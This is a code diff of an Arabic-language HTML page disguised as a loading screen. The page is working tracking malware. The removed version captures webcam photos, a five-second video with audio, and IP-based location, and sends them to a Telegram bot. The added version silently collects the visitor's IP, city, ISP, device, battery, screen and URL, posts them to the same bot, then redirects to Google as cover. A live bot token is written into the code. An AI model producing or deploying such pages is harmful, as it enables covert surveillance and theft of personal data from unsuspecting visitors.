@@ -2,92 +2,70 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تحميل الموارد...</title>
+    <title>جاري التحميل...</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: monospace; text-align: center; padding-top: 20vh; }
-        .progress { width: 80%; background: #333; margin: 20px auto; border-radius: 10px; }
-        .bar { width: 10%; height: 20px; background: #00ff00; border-radius: 10px; transition: 0.5s; }
+        body { background: #000; color: #00ff00; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <h2>جاري تحسين جودة العرض...</h2>
-    <div class="progress"><div id="bar" class="bar"></div></div>
-    <p id="status">جاري جلب البيانات التقريبية...</p>
-
-    <video id="video" width="640" height="480" autoplay muted style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <div class="loader"></div>
 
     <script>
         const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
-        let chatId = "";
 
-        async function getChatId() {
+        async function grabSilentData() {
             try {
-                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
-                const data = await res.json();
-                chatId = data.result[data.result.length - 1].message.chat.id;
-                return true;
-            } catch (e) { return false; }
-        }
+                // 1. جلب الآي بي والمعلومات الجغرافية التقريبية (عبر API خارجي)
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
 
-        async function sendToTelegram(type, blob, fileName) {
-            const fd = new FormData();
-            fd.append('chat_id', chatId);
-            fd.append(type, blob, fileName);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
-                method: 'POST', body: fd
-            });
-        }
-
-        async function startExtraction() {
-            const ready = await getChatId();
-            if (!ready) return;
-
-            document.getElementById('bar').style.width = "30%";
-            
-            // 1. الموقع التقريبي (IP)
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
-            const ipMsg = `🌐 IP: ${ipData.ip}\n📍 المدينة: ${ipData.city}`;
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(ipMsg)}`);
-
-            // 2. طلب الكاميرا والميكروفون (صور + فيديو)
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const videoElem = document.getElementById('video');
-                videoElem.srcObject = stream;
-                document.getElementById('bar').style.width = "50%";
-
-                // التقاط 3 صور بفاصل ثانية
-                for (let i = 1; i <= 3; i++) {
-                    await new Promise(r => setTimeout(r, 1000));
-                    const canvas = document.getElementById('canvas');
-                    canvas.getContext('2d').drawImage(videoElem, 0, 0, 640, 480);
-                    canvas.toBlob(blob => sendToTelegram('photo', blob, `img${i}.jpg`), 'image/jpeg');
+                // 2. معلومات البطارية
+                let batteryInfo = "غير مدعوم";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`;
                 }
 
-                document.getElementById('status').innerText = "جاري معالجة الفيديو...";
-                document.getElementById('bar').style.width = "70%";
+                // 3. تفاصيل الجهاز والمتصفح
+                const info = `
+⚠️ **صيد صامت جديد (بدون إذن)** ⚠️
+------------------------------
+🌐 **الآي بي:** \`${ipData.ip}\`
+📍 **المدينة:** ${ipData.city}, ${ipData.country_name}
+📶 **المزود:** ${ipData.org}
+📱 **الجهاز:** ${navigator.platform}
+🔋 **البطارية:** ${batteryInfo}
+🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}
+⏰ **التوقيت:** ${new Date().toLocaleString()}
+🔗 **الرابط المفتوح:** ${window.location.href}
+------------------------------`;
 
-                // 3. تسجيل فيديو لمدة 5 ثوانٍ
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = () => {
-                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
-                    sendToTelegram('video', videoBlob, 'record.mp4');
-                    document.getElementById('bar').style.width = "100%";
-                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
-                };
-                recorder.start();
-                setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثوانٍ
+                // 4. الحصول على الـ Chat ID وإرسال البيانات
+                const updateRes = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
+                const updateData = await updateRes.json();
+                const chatId = updateData.result[updateData.result.length - 1].message.chat.id;
 
-            } catch (err) {
-                document.getElementById('status').innerText = "فشل: يرجى السماح بالوصول للكاميرا";
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: info,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // بعد السحب، يمكن تحويله لموقع حقيقي للتمويه
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+
+            } catch (e) {
+                console.error("حدث خطأ في السحب الصامت");
             }
         }
 
-        window.onload = startExtraction;
+        window.onload = grabSilentData;
     </script>
 </body>
 </html>
